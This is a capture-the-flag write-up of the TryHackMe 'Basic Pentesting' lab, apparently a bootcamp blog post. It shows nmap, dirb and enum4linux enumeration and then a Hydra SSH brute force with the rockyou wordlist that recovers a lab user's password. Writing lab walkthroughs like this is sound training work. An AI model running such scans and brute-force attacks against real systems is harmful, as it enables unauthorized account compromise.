## IoC Skills Bootcamp Week 1 - Basic Pentesting

We kick things off with the [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) room on tryhackme to get some experience with brute forcing, hash cracking, service enumeration and Linux enumeration.

After setting up a Kali instance on VMware and connecting to the tryhackme network through OpenVPN we are ready to go 👍.

We begin by running nmap to discover which ports are currently open. No switches were required as the standard scan gave us the information we were looking for. 

```
$ nmap 10.10.139.208 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 11:13 EST
Nmap scan report for 10.10.139.208
Host is up (0.031s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```
We can see from the nmap scan that port 80 http is open, this might mean there is a website that we are able to look at. 

![Website Snip 1](/docs/assets/basicPentestingSnip1.PNG)

We find out there is a web page being hosted on the target machine. Not much to go from but let's use the Web Developer Tools to check if there is any other information in the raw html that we can gather.

![Website Snip 2](/docs/assets/basicPentestingSnip2.PNG)

There is a comment that implies there are other sections of the website. We can use a web content enumeration tool such as DIRB or DirBuster to scan the site for any hidden folders or files.

```
$ dirb http://10.10.139.208

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb  6 13:36:42 2022
URL_BASE: http://10.10.139.208/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.139.208/ ----
==> DIRECTORY: http://10.10.139.208/development/                                      
+ http://10.10.139.208/index.html (CODE:200|SIZE:158)                                 
+ http://10.10.139.208/server-status (CODE:403|SIZE:301)                              
                                                                                      
---- Entering directory: http://10.10.139.208/development/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Feb  6 13:40:40 2022
DOWNLOADED: 4612 - FOUND: 2
```

DIRB was able to find a listable directory named development. Let's check its contents in our web browser. 

![Website Snip 3](/docs/assets/basicPentestingSnip3.PNG)

There are two text notes that we can view. 

![Website Snip 4](/docs/assets/basicPentestingSnip4.PNG)

The first contains some information regarding the server and version number that they are running which may be useful to us. We can also note that Server Message Block has been set up and that there are two users referred to as "K" and "J".

![Website Snip 5](/docs/assets/basicPentestingSnip5.PNG)

The second note talks about "J" using weak password credentials as their hash was able to be cracked "really easily". The mention of /etc/shadow means it is a linux box so we can try enum4linux to enumerate the system for more information.

```
$ enum4linux 10.10.139.208

 ======================================================================== 
|    Users on 10.10.139.208 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 

[I] Found new SID: S-1-22-1
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
The scan found two users, Jay and Kay, which fits in with the intials we saw earlier. We know that Jay has weak password credentials so we will try to brute force his password with the use of Hydra. We will try one of the default password lists (rockyou).

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz 10.10.139.208  ssh

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-06 14:44:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.139.208:22/
[STATUS] 183.00 tries/min, 183 tries in 00:01h, 14344223 to do in 1306:24h, 16 active
[STATUS] 91.00 tries/min, 273 tries in 00:03h, 14344143 to do in 2627:08h, 16 active
[STATUS] 79.71 tries/min, 558 tries in 00:07h, 14343874 to do in 2999:02h, 16 active
[22][ssh] host: 10.10.139.208   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```
